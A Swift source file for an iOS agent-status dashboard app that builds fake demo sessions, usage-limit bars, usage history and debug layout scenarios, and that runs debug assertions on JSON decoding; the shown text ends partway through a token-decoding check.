//
//  DemoData.swift
//  AgStatus
//
//  Believable fake sessions for demo mode, plus a tick() that walks them
//  through plausible status transitions so the board feels alive, and the
//  Focus listeners those sessions would see.
//

import Foundation

enum DemoData {

    /// The two machines the demo's Focus-enabled sessions run on: a "Mac"
    /// whose listener is connected, and a "MacBook" that went away five
    /// minutes ago — so both faces of the "Bring to front" control show.
    static let onlineMachine = Host.Machine(id: "9f2c1b7e4d3a8f0c5e6b2a1d9c8f7e6b", name: "Mac")
    static let offlineMachine = Host.Machine(id: "0c4e7a19b3d25f68e1a7c9d04b6f2e83", name: "MacBook")

    /// Four sessions that look like a real evening of agent work.
    ///
    /// Their token totals are sized to their ages — roughly what a session of
    /// that length actually spends — and span the formats the card has to
    /// render: hundreds of thousands, millions, and (data-pipeline) a session
    /// with NO total at all. That last one is not an oversight. The totals
    /// arrive on the hook's own 15-minute throttle, so a card younger than that
    /// legitimately has no figure yet, and the design gets reviewed here: the
    /// absent case has to be in front of the owner, showing no number rather
    /// than a zero or a dash.
    static func initialSessions() -> [Session] {
        #if DEBUG
        return agedForScreenshots(seededSessions())
        #else
        return seededSessions()
        #endif
    }

    private static func seededSessions() -> [Session] {
        #if DEBUG
        if usesPool { return scenarioSessions() }
        #endif
        let now = nowMillis()
        return [
            Session(id: "demo-api-server",
                    name: "api-server",
                    status: .coding,
                    message: "Editing src/auth/token.ts",
                    project: "acme-api",
                    createdAt: now - 42 * 60_000,
                    updatedAt: now - 15_000,
                    host: Host(machine: onlineMachine,
                               app: Host.App(slug: "agterm", name: "agterm", kind: "terminal")),
                    tokens: 486_200),
            // Finished eight minutes ago and nobody has looked: the card that
            // shows the closing beat when it finally moves.
            //
            // It deliberately reports no host. The beat sits in the same line
            // as the offline note and yields to it — a machine you cannot reach
            // is more actionable than how long something waited — so a card
            // with an offline machine can never display one. `data-pipeline`
            // has exactly that shape, which is why the beat needs a second card
            // to be visible at all here.
            Session(id: "demo-webapp",
                    name: "webapp",
                    status: .done,
                    message: "Finished — 12 files changed",
                    project: "acme-web",
                    createdAt: now - 95 * 60_000,
                    updatedAt: now - 8 * 60_000,
                    tokens: 1_438_000),
            // Eighteen minutes old and nothing reported for it yet: the card
            // that must show no number.
            Session(id: "demo-data-pipeline",
                    name: "data-pipeline",
                    status: .blocked,
                    message: "Needs permission approval",
                    project: "etl-jobs",
                    createdAt: now - 18 * 60_000,
                    updatedAt: now - 3 * 60_000,
                    host: Host(machine: offlineMachine,
                               app: Host.App(slug: "iterm2", name: "iTerm2", kind: "terminal"))),
            // A Codex session so the demo board shows both agents' limit
            // blocks, not just Claude's. Its total runs higher than a Claude
            // session of the same length because Codex counts cache reads in
            // its own cumulative figure — the two are not comparable, and the
            // demo should not imply they are.
            Session(id: "demo-docs-site",
                    name: "docs-site",
                    status: .done,
                    message: "All tasks complete — 12 files changed",
                    project: "docs",
                    source: "codex",
                    createdAt: now - 3 * 3_600_000,
                    updatedAt: now - 26 * 60_000,
                    tokens: 2_830_000),
        ]
    }

    /// Listener presence as the store keeps it: what a `machines` frame would
    /// seed, plus the offline `machine` frame the board saw five minutes ago.
    static func machines() -> [String: MachinePresence] {
        let now = nowMillis()
        let online = MachinePresence(id: onlineMachine.id, name: onlineMachine.name,
                                     online: true, since: now - 2 * 3_600_000)
        let offline = MachinePresence(id: offlineMachine.id, name: offlineMachine.name,
                                      online: false, lastSeen: now - 5 * 60_000)
        #if DEBUG
        if usesPool { return scenarioMachines([online, offline], now: now) }
        #endif
        return [online.id: online, offline.id: offline]
    }

    /// Plan-limit bars matching a busy-but-not-throttled evening: one block
    /// per agent, each with its own session, all-models and per-model windows.
    static func usage() -> [UsageInfo] {
        let now = nowMillis()
        var claudeWeek: Double = 62
        #if DEBUG
        // AGSTATUS_DEMO_LIMITS=hi puts Claude's weekly window past the 85%
        // where a limit is drawn in the alarm's red. That is the capture the
        // head's blocked edge was designed against: a head with a red bar and
        // nothing blocked must not read like a head that needs you.
        let limits = ProcessInfo.processInfo.environment["AGSTATUS_DEMO_LIMITS"]
        if limits == "hi" { claudeWeek = 91 }
        var all = claudeAndCodex(now: now, claudeWeek: claudeWeek)
        if scenario == .threeLimits { all.append(geminiUsage(now: now)) }
        // AGSTATUS_DEMO_LIMITS=many gives Codex six windows, the most one
        // report may carry (MAX_USAGE_WINDOWS in src/store.ts): the head a
        // phone must not pin whole. A number, 1 to 6, gives it the first that
        // many, so either side of BoardArrangement.narrowPinnedWindows can be
        // captured.
        if let count = limits == "many" ? 6 : limits.flatMap(Int.init), (1...6).contains(count) {
            let six = codexSixWindows(now: now)
            let windows = Array(six.windows.prefix(count))
            all = all.map { $0.source == "codex" ? UsageInfo(source: "codex", windows: windows, updatedAt: now) : $0 }
        }
        return all
        #else
        return claudeAndCodex(now: now, claudeWeek: claudeWeek)
        #endif
    }

    #if DEBUG
    /// Codex at the six windows a report may carry: the all-models week, a
    /// session and a week for each of two models, and a code-review week.
    private static func codexSixWindows(now: Int64) -> UsageInfo {
        let week = now + 4 * 86_400_000 + 2 * 3_600_000
        return UsageInfo(source: "codex",
                         windows: [
                             UsageWindow(id: "week", label: "Weekly (all models)", usedPct: 47, resetsAt: week),
                             UsageWindow(id: "session_gpt_6_astra", label: "Session (GPT-6-Astra)",
                                         usedPct: 22, resetsAt: now + 96 * 60_000),
                             UsageWindow(id: "week_gpt_6_astra", label: "Weekly (GPT-6-Astra)",
                                         usedPct: 38, resetsAt: week),
                             UsageWindow(id: "session_gpt_6_mini", label: "Session (GPT-6-Mini)",
                                         usedPct: 9, resetsAt: now + 41 * 60_000),
                             UsageWindow(id: "week_gpt_6_mini", label: "Weekly (GPT-6-Mini)",
                                         usedPct: 64, resetsAt: week),
                             UsageWindow(id: "week_review", label: "Weekly (code review)",
                                         usedPct: 12, resetsAt: week),
                         ],
                         updatedAt: now)
    }

    /// AGSTATUS_DEMO_STALE=<minutes> — every working session (planning,
    /// coding, testing) last reported that long ago. Past
    /// `SessionCardView.staleAfter`, ten minutes, that is a stale card, which
    /// the demo never shows otherwise: its sessions are seconds to a few
    /// minutes old. Pair it with AGSTATUS_DEMO_FREEZE, or the first tick
    /// brings a session back to life.
    private static func agedForScreenshots(_ sessions: [Session]) -> [Session] {
        guard let minutes = ProcessInfo.processInfo.environment["AGSTATUS_DEMO_STALE"].flatMap(Int.init),
              minutes > 0 else { return sessions }
        let at = nowMillis() - Int64(minutes) * 60_000
        return sessions.map { session in
            guard session.status.isActive else { return session }
            var aged = session
            aged.updatedAt = min(session.updatedAt, at)
            aged.createdAt = min(session.createdAt, aged.updatedAt)
            return aged
        }
    }
    #endif

    private static func claudeAndCodex(now: Int64, claudeWeek: Double) -> [UsageInfo] {
        [
            UsageInfo(source: "claude",
                      windows: [
                          UsageWindow(id: "session",
                                      label: "Current session",
                                      usedPct: 34,
                                      resetsAt: now + 137 * 60_000),
                          UsageWindow(id: "week",
                                      label: "Weekly (all models)",
                                      usedPct: claudeWeek,
                                      resetsAt: now + 2 * 86_400_000 + 5 * 3_600_000),
                          UsageWindow(id: "week_fable",
                                      label: "Weekly (Fable)",
                                      usedPct: 41,
                                      resetsAt: now + 2 * 86_400_000 + 5 * 3_600_000),
                      ],
                      updatedAt: now),
            UsageInfo(source: "codex",
                      windows: [
                          UsageWindow(id: "week",
                                      label: "Weekly (all models)",
                                      usedPct: 47,
                                      resetsAt: now + 4 * 86_400_000 + 2 * 3_600_000),
                          UsageWindow(id: "session_gpt_6_astra",
                                      label: "Session (GPT-6-Astra)",
                                      usedPct: 22,
                                      resetsAt: now + 96 * 60_000),
                          UsageWindow(id: "week_gpt_6_astra",
                                      label: "Weekly (GPT-6-Astra)",
                                      usedPct: 38,
                                      resetsAt: now + 4 * 86_400_000 + 2 * 3_600_000),
                      ],
                      updatedAt: now),
        ]
    }

    /// Offline stand-in for `/api/usage/history`: a month of plausible token
    /// spend per project, with the plan-limit readings recorded over it. The
    /// limit series deliberately start partway through the range — a board only
    /// knows the limits it has actually seen — and each one lands on the same
    /// percentage the demo bars show, so the two screens agree. Seeded, so the
    /// demo (and its screenshots) look the same on every launch.
    static func usageHistory(days: Int = UsageHistory.defaultDays) -> UsageHistory {
        let grid = UsageHistory.dayRange(days)
        var rng = SeededGenerator(seed: 0x51E5_A6ED_D0C5)
        var series: [UsageHistorySeries] = []
        var projects: [UsageProjectDay] = []

        for plan in demoPlans {
            for window in plan.windows {
                series.append(limitSeries(source: plan.source, window: window, grid: grid, rng: &rng))
            }
            for project in plan.projects {
                projects.append(contentsOf: tokenRows(source: plan.source,
                                                      project: project,
                                                      grid: grid,
                                                      rng: &rng))
            }
        }
        // Quiet days, applied to the UNION rather than per project.
        //
        // `tokenRows` already skips about one day in five, but it rolls
        // independently for every project — and a day counts as active if ANY
        // project spent. With several projects the gaps almost never line up,
        // so the union covered nearly every day and the demo streak read
        // "Platinum, 90 days active" on launch: the ladder maxed, no tier below
        // the top reachable, and the forgiveness rule never exercised in the
        // one place it can actually be looked at.
        //
        // These offsets are counted back from today and chosen rather than
        // rolled, so the demo board is the same every launch and shows a
        // specific, reviewable shape: three consecutive quiet days nineteen
        // back end the run, and two isolated ones inside it are forgiven. That
        // lands on nineteen days — Silver, partway to Gold — which is a state
        // with something to draw, unlike the top rung.
        let quietOffsets: Set<Int> = [3, 11, 19, 20, 21]
        let quietDays = Set(quietOffsets.compactMap { offset -> String? in
            let index = grid.count - 1 - offset
            return grid.indices.contains(index) ? grid[index] : nil
        })
        let spent = projects.filter { !quietDays.contains($0.day) }

        return UsageHistory(days: grid.count, history: series, projects: spent)
    }

    /// What each demo agent has been spending, and on what.
    private struct DemoPlan {
        let source: String
        /// One per limit window: its id, how far back the board first recorded
        /// it, where it stands today, and whether it accrues over a week.
        let windows: [(id: String, startsDaysAgo: Int, endPct: Double, weekly: Bool)]
        /// Projects and their share of this agent's daily spend.
        let projects: [(name: String, weight: Double)]
    }

    private static let demoPlans: [DemoPlan] = [
        DemoPlan(source: "claude",
                 windows: [("session", 9, 34, false),
                           ("week", 22, 62, true),
                           ("week_fable", 22, 41, true)],
                 projects: [("acme-api", 1.0),
                            ("acme-web", 0.66),
                            ("etl-jobs", 0.31),
                            ("infra-scripts", 0.12)]),
        DemoPlan(source: "codex",
                 windows: [("week", 16, 47, true),
                           ("session_gpt_6_astra", 6, 22, false),
                           ("week_gpt_6_astra", 16, 38, true)],
                 projects: [("docs", 1.0), ("acme-web", 0.42)]),
    ]

    /// A step function: one reading per day, kept only when it changed.
    private static func limitSeries(source: String,
                                    window: (id: String, startsDaysAgo: Int, endPct: Double, weekly: Bool),
                                    grid: [String],
                                    rng: inout SeededGenerator) -> UsageHistorySeries {
        let first = max(0, grid.count - window.startsDaysAgo)
        let now = nowMillis()
        var value = Double.random(in: 4...12, using: &rng)
        var last: Double?
        var points: [UsageHistoryPoint] = []

        for index in first..<grid.count {
            if window.weekly {
                // Weekly caps saw-tooth: they climb all week, then reset.
                if (grid.count - 1 - index) % 7 == 6 {
                    value = Double.random(in: 2...9, using: &rng)
                } else {
                    value = min(96, value + Double.random(in: 3...13, using: &rng))
                }
            } else {
                // A session window is short-lived; each day stands on its own.
                value = Double.random(in: 6...58, using: &rng)
            }
            // Today's reading is the one the board's bars already show.
            let reading = (index == grid.count - 1 ? window.endPct : value).rounded()
            guard reading != last else { continue }
            last = reading
            let at = min(now, UsageHistory.dayStartMillis(grid[index]) + 18 * 3_600_000)
            points.append(UsageHistoryPoint(at: at, usedPct: reading))
        }
        return UsageHistorySeries(source: source, windowId: window.id, points: points)
    }

    /// Absolute per-day totals, with the quiet days a real month has.
    private static func tokenRows(source: String,
                                  project: (name: String, weight: Double),
                                  grid: [String],
                                  rng: inout SeededGenerator) -> [UsageProjectDay] {
        var rows: [UsageProjectDay] = []
        for (index, day) in grid.enumerated() {
            if Double.random(in: 0..<1, using: &rng) < 0.18 { continue } // a day off
            let ramp = 0.55 + 0.45 * Double(index) / Double(max(1, grid.count - 1))
            let jitter = Double.random(in: 0.45...1.45, using: &rng)
            let tokens = (26_000_000 * project.weight * ramp * jitter).rounded()
            rows.append(UsageProjectDay(source: source, project: project.name, day: day, tokens: tokens))
        }
        return rows
    }

    /// splitmix64 — a few lines of deterministic randomness, so the demo screen
    /// is the same every time without pulling in a dependency.
    private struct SeededGenerator: RandomNumberGenerator {
        private var state: UInt64

        init(seed: UInt64) { state = seed }

        mutating func next() -> UInt64 {
            state &+= 0x9E37_79B9_7F4A_7C15
            var z = state
            z = (z ^ (z >> 30)) &* 0xBF58_476D_1CE4_E5B9
            z = (z ^ (z >> 27)) &* 0x94D0_49BB_1331_11EB
            return z ^ (z >> 31)
        }
    }

    /// Advances a random subset of sessions (at least one) along plausible
    /// transitions, refreshing messages and updatedAt. An emptied demo board
    /// re-seeds itself so the demo never dead-ends — with whatever the launch
    /// seeded it with, which for the debug `empty` scenario is nothing.
    static func tick(_ sessions: [Session]) -> [Session] {
        #if DEBUG
        if isFrozen { return sessions }
        #endif
        guard !sessions.isEmpty else { return initialSessions() }
        let now = nowMillis()
        var updated = sessions
        var changedAny = false

        for index in updated.indices where Double.random(in: 0..<1) < 0.45 {
            updated[index] = advance(updated[index], at: now)
            changedAny = true
        }
        if !changedAny, let index = updated.indices.randomElement() {
            updated[index] = advance(updated[index], at: now)
        }
        return updated
    }

    /// A believable timeline for a demo session, ending in its current state.
    static func history(for session: Session) -> [HistoryEvent] {
        // A full session's worth of steps: enough to fill the timeline on the
        // largest iPhone, and to show a blocked stretch resolving.
        let steps: [(AgentStatus, String, Int64)] = [
            (.idle, "Session started", 46),
            (.planning, "Reading the codebase…", 44),
            (.planning, "Drafting an implementation plan", 40),
            (.coding, "Editing src/auth/token.ts", 35),
            (.coding, "Implementing retry with backoff", 31),
            (.testing, "npm test — 41 passing, 2 failing", 26),
            (.coding, "Fixing null check in parser.js", 22),
            (.blocked, "Needs permission approval", 18),
            (.coding, "Refactoring api/routes.ts", 14),
            (.testing, "npm test — 42 passing, 1 pending", 9),
            (.coding, "Writing SessionStore.swift", 5),
        ]
        var events: [HistoryEvent] = []
        for (index, step) in steps.enumerated() {
            events.append(HistoryEvent(seq: Int64(index),
                                       status: step.0,
                                       message: step.1,
                                       at: session.updatedAt - step.2 * 60_000))
        }
        events.append(HistoryEvent(seq: Int64(steps.count),
                                   status: session.status,
                                   message: session.message,
                                   at: session.updatedAt))
        return events.reversed() // newest first, like the server
    }

    // MARK: Scenarios

    #if DEBUG
    /// The boards the per-agent layout was designed against, by name.
    ///
    /// `docs/design/prototypes/agent-sections.html` is the agreed design, and
    /// it draws seven boards: the demo, and six that each put a different
    /// strain on the layout. AGSTATUS_DEMO_SCENARIO=<name> starts demo mode on
    /// the same one — the same sessions, card for card, from the same pool —
    /// so a simulator capture can be laid beside the prototype's and differ
    /// only where the implementation does.
    ///
    /// Debug builds only, like every other launch variable here. `demo` is the
    /// default and is the App Store demo board, untouched.
    ///
    /// The launch variables that go with it, all read only in a debug build:
    ///   AGSTATUS_DEMO_SCENARIO  demo | busy | lopsided | solo | three |
    ///                           three-limits | long | empty
    ///   AGSTATUS_DEMO_BLOCKED   claude (the first agent's blocked sessions
    ///                           are working instead) | none (nobody is blocked)
    ///   AGSTATUS_DEMO_LIMITS    hi (Claude's weekly limit at 91%) | many
    ///                           (Codex reports six windows) | 1…6 (that
    ///                           many of the six)
    ///   AGSTATUS_DEMO_STALE     <minutes> (every working session last
    ///                           reported that long ago: past 10, stale)
    ///   AGSTATUS_DEMO_TITLES    1 (Claude's cards carry session titles, as
    ///                           the Claude app names them, with the folder
    ///                           as the "in <repo>" — any scenario)
    ///   AGSTATUS_DEMO_FREEZE    1 (the demo stops ticking, so a capture
    ///                           cannot race a status change)
    ///   AGSTATUS_BOARD_WIDTH    <points> (BoardView: clamps the board, so a
    ///                           full-screen iPad can stand in for Split View)
    ///   AGSTATUS_DEMO_CONNECTION live | connecting | idle | gone (BoardView:
    ///                           the toolbar's connection lamp, in that
    ///                           state, where the DEMO badge would be;
    ///                           connecting is drawn as reconnecting)
    ///   AGSTATUS_JUMP           <source> (BoardView: presses that agent's
    ///                           alarm once the board is laid out)
    enum Scenario: String {
        case demo
        /// Five and four: two full columns, something blocked in each.
        case busy
        /// Seven and one: uneven columns, and one card whose dismissal takes
        /// its agent — and its column — off the board.
        case lopsided
        /// One agent: nothing to put beside it.
        case solo
        /// Three agents, the third reporting no limits.
        case three
        /// The same three agents, every one reporting limits. Not one of the
        /// prototype's boards: it is the phone's worst case for pinned heads,
        /// which the prototype never drew, and why a phone pins no more than
        /// two (`BoardArrangement.narrowPinnedHeads`).
        case threeLimits = "three-limits"
        /// Worktree names, which is what a session is called when it runs in
        /// one, and which are longer than any column.
        case long
        /// Nothing running. The heads are the limits and nothing else.
        case empty
    }

    static let scenario = Scenario(
        rawValue: ProcessInfo.processInfo.environment["AGSTATUS_DEMO_SCENARIO"] ?? ""
    ) ?? .demo

    /// AGSTATUS_DEMO_FREEZE=1 — `tick` does nothing, so the board stays as it
    /// was seeded. Without it a capture is a race against the next status
    /// change, and no two would ever match.
    static let isFrozen = ProcessInfo.processInfo.environment["AGSTATUS_DEMO_FREEZE"] == "1"

    /// AGSTATUS_DEMO_TITLES=1 — Claude's cards are named by session titles.
    ///
    /// The prototype's pool predates titles and names every card by its
    /// folder. A real board no longer looks like that: the Claude app titles
    /// every session, and a title runs to several words where a folder name
    /// was one. Without this the demo shows nothing longer than a worktree
    /// slug, and the card's two-line name and its meta line's priorities have
    /// nothing to be checked against.
    static let showsTitles = ProcessInfo.processInfo.environment["AGSTATUS_DEMO_TITLES"] == "1"

    /// The board's sessions come from the pool below rather than from the
    /// App Store demo, which a plain launch leaves untouched.
    private static var usesPool: Bool { scenario != .demo || showsTitles }

    /// A third agent's limits, as a Gemini plan reports them.
    private static func geminiUsage(now: Int64) -> UsageInfo {
        UsageInfo(source: "gemini",
                  windows: [
                      UsageWindow(id: "daily", label: "Daily requests", usedPct: 18,
                                  resetsAt: now + 9 * 3_600_000),
                      UsageWindow(id: "minute", label: "Per minute", usedPct: 5,
                                  resetsAt: now + 40_000),
                  ],
                  updatedAt: now)
    }

    /// Two more machines for the scenarios, both with a listener connected.
    private static let studioMachine = Host.Machine(id: "5a1d93c07e2b4f86a0c3d7e915b4f260", name: "Studio")
    private static let laptopMachine = Host.Machine(id: "c7e04b1a96d3f25870b1e4a3d92c6f15", name: "MacBook Pro")

    /// One card of the prototype's pool. `age` is seconds since its last
    /// update; `calm` is what a blocked session is doing on a board where it
    /// is not blocked.
    private struct Pooled {
        let id: String
        let source: String
        let name: String
        let status: AgentStatus
        let message: String
        let age: Int64
        var machine: Host.Machine?
        /// Only when the session has moved; otherwise it is where it started,
        /// and the card says nothing about it.
        var project: String?
        var tokens: Int64?
        var calm: (status: AgentStatus, message: String)?
        /// What the Claude app calls it, under AGSTATUS_DEMO_TITLES. Claude
        /// cards only: Codex does not title its sessions.
        var title: String?
    }

    /// The prototype's `POOL`, in its order and under its ids.
    private static let pool: [Pooled] = [
        Pooled(id: "api", source: "claude", name: "api-server", status: .coding,
               message: "Editing src/auth/token.ts", age: 15,
               machine: onlineMachine, project: "acme-api", tokens: 486_200,
               title: "Fix token refresh race in the auth middleware"),
        Pooled(id: "pipe", source: "claude", name: "data-pipeline", status: .blocked,
               message: "Needs permission approval", age: 180,
               machine: offlineMachine, project: "etl-jobs",
               calm: (.coding, "Backfilling the March partitions"),
               title: "Backfill March partitions for the events table"),
        Pooled(id: "web", source: "claude", name: "webapp", status: .done,
               message: "Finished — 12 files changed", age: 480,
               project: "acme-web", tokens: 1_438_000,
               title: "Migrate checkout to the new design tokens"),
        Pooled(id: "bill", source: "claude", name: "billing-worker", status: .testing,
               message: "Running 214 tests — 3 failing", age: 60,
               machine: studioMachine, tokens: 912_400,
               title: "Investigate failing proration tests in the billing worker"),
        Pooled(id: "ios", source: "claude", name: "ios-app", status: .planning,
               message: "Drafting the push-token migration plan", age: 300,
               machine: onlineMachine, tokens: 88_100,
               title: "Plan the push-token migration for iOS 26"),
        Pooled(id: "infra", source: "claude", name: "infra", status: .idle,
               message: "Session started", age: 720,
               machine: onlineMachine),
        Pooled(id: "tokens", source: "claude", name: "design-tokens", status: .done,
               message: "Finished — 4 files changed", age: 1860,
               machine: studioMachine, tokens: 220_500),
        Pooled(id: "docs", source: "codex", name: "docs-site", status: .done,
               message: "All tasks complete — 12 files changed", age: 1560,
               project: "docs", tokens: 2_830_000),
        Pooled(id: "land", source: "codex", name: "landing", status: .coding,
               message: "Rewriting the pricing table", age: 20,
               machine: onlineMachine, tokens: 312_700),
        Pooled(id: "sdk", source: "codex", name: "sdk-python", status: .testing,
               message: "pytest -k retry — 41 passed", age: 120,
               machine: studioMachine, tokens: 540_300),
        Pooled(id: "search", source: "codex", name: "search-indexer", status: .blocked,
               message: "Approve: cargo publish --dry-run", age: 360,
               machine: studioMachine, tokens: 2_100_000,
               calm: (.testing, "cargo test — 212 passed")),
        Pooled(id: "evals", source: "gemini", name: "notebook-evals", status: .coding,
               message: "Editing eval/harness.py", age: 70,
               machine: onlineMachine),
        Pooled(id: "tf", source: "gemini", name: "terraform-live", status: .blocked,
               message: "Approve: terraform plan", age: 240,
               machine: studioMachine,
               calm: (.coding, "Writing modules/vpc/main.tf")),
        Pooled(id: "wt1", source: "claude", name: "session-organization-agents-c27901", status: .coding,
               message: "Editing ios/AgStatus/BoardView.swift", age: 10,
               machine: laptopMachine, project: "claude-status", tokens: 1_100_000,
               title: "Session organization by agent"),
        Pooled(id: "wt2", source: "claude", name: "session-organization-agents-b1f44e", status: .blocked,
               message: "Approve: xcodebuild -scheme AgStatus test", age: 130,
               machine: laptopMachine, project: "claude-status", tokens: 640_800,
               calm: (.testing, "xcodebuild test — 318 passed"),
               title: "Fix listener reinstall leaving Focus stopped"),
        Pooled(id: "wt3", source: "claude", name: "claude-status-dashboard-release-1.6", status: .done,
               message: "Finished — 23 files changed", age: 840,
               machine: studioMachine, tokens: 3_400_000,
               title: "Investigate why the SSE stream drops after the iPad wakes from sleep"),
        Pooled(id: "wt4", source: "codex", name: "agstatus-listener-windows-terminal-focus", status: .testing,
               message: "npm test -- focus/wt — 57 passed", age: 80,
               machine: studioMachine, tokens: 402_600),
    ]

    /// The prototype's `SCENARIOS`: which cards are on which board.
    private static var scenarioCards: [Pooled] {
        let ids: [String]
        switch scenario {
        case .demo: ids = ["api", "pipe", "web", "docs"]
        case .busy: ids = ["api", "bill", "pipe", "ios", "web", "land", "sdk", "search", "docs"]
        case .lopsided: ids = ["api", "bill", "pipe", "ios", "web", "infra", "tokens", "docs"]
        case .solo: ids = ["api", "bill", "pipe", "web"]
        case .three, .threeLimits: ids = ["api", "pipe", "web", "land", "docs", "evals", "tf"]
        case .long: ids = ["wt1", "wt2", "wt3", "wt4", "docs"]
        case .empty: ids = []
        }
        return ids.compactMap { id in pool.first { $0.id == id } }
    }

    /// Whether `card` is one the launch asked to be quiet.
    ///
    /// AGSTATUS_DEMO_BLOCKED=none calms every blocked session; `claude` calms
    /// only the first agent's — the prototype's "Claude quiet", which leaves
    /// one head with an alarm beside one without, the comparison the blocked
    /// edge exists for.
    private static func isCalmed(_ card: Pooled, among cards: [Pooled]) -> Bool {
        guard card.calm != nil else { return false }
        switch ProcessInfo.processInfo.environment["AGSTATUS_DEMO_BLOCKED"] {
        case "none": return true
        case "claude": return card.source == cards.map(\.source).min()
        default: return false
        }
    }

    private static func scenarioSessions() -> [Session] {
        let now = nowMillis()
        let cards = scenarioCards
        return cards.map { card in
            let calm = isCalmed(card, among: cards) ? card.calm : nil
            return Session(id: card.id,
                           name: showsTitles ? card.title ?? card.name : card.name,
                           status: calm?.status ?? card.status,
                           message: calm?.message ?? card.message,
                           // A session that stayed where it started reports
                           // its own name, which is what the card reads as
                           // "has not moved". Under a title that folder is
                           // no longer the name, and reads as "in <folder>".
                           project: card.project ?? card.name,
                           source: card.source,
                           createdAt: now - (card.age + 40 * 60) * 1000,
                           updatedAt: now - card.age * 1000,
                           host: card.machine.map {
                               Host(machine: $0,
                                    app: Host.App(slug: "agterm", name: "agterm", kind: "terminal"))
                           },
                           tokens: card.tokens)
        }
    }

    /// The scenarios' machines: the demo's two, the two above, and — on a
    /// board where data-pipeline has been calmed — its MacBook back online,
    /// because the prototype's calm card is a working one with a live Focus
    /// control, not a quiet card on a dead machine.
    private static func scenarioMachines(_ demo: [MachinePresence], now: Int64) -> [String: MachinePresence] {
        let cards = scenarioCards
        let woken = cards.contains { $0.machine == offlineMachine && isCalmed($0, among: cards) }
        var all = demo.map { presence -> MachinePresence in
            guard woken, presence.id == offlineMachine.id else { return presence }
            return MachinePresence(id: presence.id, name: presence.name, online: true,
                                   since: now - 20 * 60_000)
        }
        for machine in [studioMachine, laptopMachine] {
            all.append(MachinePresence(id: machine.id, name: machine.name, online: true,
                                       since: now - 2 * 3_600_000))
        }
        return Dictionary(all.map { ($0.id, $0) }) { first, _ in first }
    }
    #endif

    // MARK: Decoding checks

    #if DEBUG
    /// The project has no unit-test target, so the Focus wire models are
    /// checked here, when demo mode starts in a debug build: a null, absent
    /// or malformed host leaves `host == nil` (never a dropped card), an
    /// unknown enum value is kept as `.other` rather than failing the frame,
    /// and a session survives an encode/decode round trip.
    static func verifyFocusDecoding() {
        let decoder = JSONDecoder()
        func session(_ json: String) -> Session? {
            try? decoder.decode(Session.self, from: Data(json.utf8))
        }

        // host: null / absent / not an object / no machine / blank id → nil.
        assert(session(#"{"id":"s","host":null}"#)?.host == nil, "null host")
        assert(session(#"{"id":"s"}"#)?.host == nil, "absent host")
        assert(session(#"{"id":"s","host":"agterm"}"#)?.host == nil, "string host")
        assert(session(#"{"id":"s","host":{"app":{"slug":"agterm"}}}"#)?.host == nil, "host without machine")
        assert(session(#"{"id":"s","host":{"machine":{"id":""}}}"#)?.host == nil, "blank machine id")
        assert(session(#"{"id":"s","host":null}"#) != nil, "the card itself still decodes")

        // A full host, and one with only the machine id.
        let full = session(#"{"id":"s","host":{"machine":{"id":"9f2c","name":"Mac"},"app":{"slug":"agterm","name":"agterm","kind":"terminal"}}}"#)
        assert(full?.host == Host(machine: Host.Machine(id: "9f2c", name: "Mac"),
                                  app: Host.App(slug: "agterm", name: "agterm", kind: "terminal")),
               "full host")
        let bare = session(#"{"id":"s","host":{"machine":{"id":"9f2c"}}}"#)?.host
        assert(bare?.machine.name == "" && bare?.app.slug == "other" && bare?.app.kind == "unknown",
               "bare host defaults")

        // Round trip: what we encode decodes to the same session.
        if let full, let data = try? JSONEncoder().encode(full) {
            assert((try? decoder.decode(Session.self, from: data)) == full, "host round trip")
        } else {
            assertionFailure("session encode")
        }

        // Presence: an offline frame has no name; timestamps may be floats.
        let frames = try? decoder.decode(
            [MachinePresence].self,
            from: Data(#"[{"id":"a","name":"Mac","online":true,"since":1},{"id":"b","online":false,"lastSeen":5.0}]"#.utf8))
        assert(frames?.count == 2 && frames?[0].online == true && frames?[0].name == "Mac", "online frame")
        assert(frames?[1].online == false && frames?[1].name == nil && frames?[1].lastSeen == 5, "offline frame")

        // Acks: known enums map, unknown ones are kept, nulls are nil.
        let known = try? decoder.decode(
            CommandAck.self,
            from: Data(#"{"id":"c","session_id":"s","machine_id":"m","type":"focus","result":"failed","reach":null,"reason":"not-running"}"#.utf8))
        assert(known?.result == .failed && known?.reach == nil && known?.reason == .notRunning, "known ack")
        let unknown = try? decoder.decode(
            CommandAck.self,
            from: Data(#"{"id":"c","session_id":"s","type":"warp","result":"levitated","reach":"orbit","reason":"gremlins"}"#.utf8))
        assert(unknown?.type == .other("warp") && unknown?.result == .other("levitated"), "unknown ack values")
        assert(unknown?.reach == .other("orbit") && unknown?.reason == .other("gremlins"), "unknown ack values")
        assert(unknown?.reason?.rawValue == "gremlins" && CommandReason.appNotRunning.rawValue == "app-not-running",
               "raw values")
        assert(CommandReason(rawValue: "app-not-running") == .appNotRunning, "wire names")

        // Command status: state enum with the same tolerance; the receipt defaults to delivered.
        let status = try? decoder.decode(
            CommandStatus.self,
            from: Data(#"{"id":"c","state":"done","result":"focused","reach":"pane","reason":null}"#.utf8))
        assert(status?.state == .done && status?.result == .focused && status?.reach == .pane, "status")
        assert((try? decoder.decode(CommandStatus.self, from: Data(#"{"id":"c","state":"warped"}"#.utf8)))?.state
               == .other("warped"), "unknown state")
        let receipt = try? decoder.decode(CommandReceipt.self, from: Data(#"{"id":"c"}"#.utf8))
        assert(receipt?.delivered == true, "receipt default")
        assert((try? decoder.decode(CommandReceipt.self, from: Data(#"{"id":"c","delivered":false}"#.utf8)))?.delivered
               == false, "receipt false")
    }

    /// The `tokens` contract, checked alongside the Focus models when demo mode
    /// starts in a debug build.
    ///
    /// Absence is what these guard. The server omits the key entirely whenever
    /// it has no figure — reporting off, a third-party agent, nothing heard
    /// yet, a total aged out — and a client that quietly turned that into 0
    /// would tell the owner a session that has been running all evening spent
    /// nothing. Everything else here is the tolerance the rest of this file
    /// already insists on: one odd value must never cost a whole card.
    static func verifyTokenDecoding() {
        let decoder = JSONDecoder()
        func session(_ json: String) -> Session? {
            try? decoder.decode(Session.self, from: Data(json.utf8))
        }

        // Absent / null / wrong type / negative → no figure, and the card still decodes.
        assert(session(#"{"id":"s"}"#)?.tokens == nil, "absent tokens")
        assert(session(#"{"id":"s","tokens":null}"#)?.tokens == nil, "null tokens")
        assert(session(#"{"id":"s","tokens":"48200"}"#)?.tokens == nil, "string tokens")
        assert(session(#"{"id":"s","tokens":-5}"#)?.tokens == nil, "negative tokens")
        assert(session(#"{"id":"s","tokens":"48200"}"#) != nil, "the card itself still decodes")

        // Zero is a REPORTED figure, not the absent case.
        assert(session(#"{"id":"s","tokens":0}"#)?.tokens == 0, "zero is a figure")
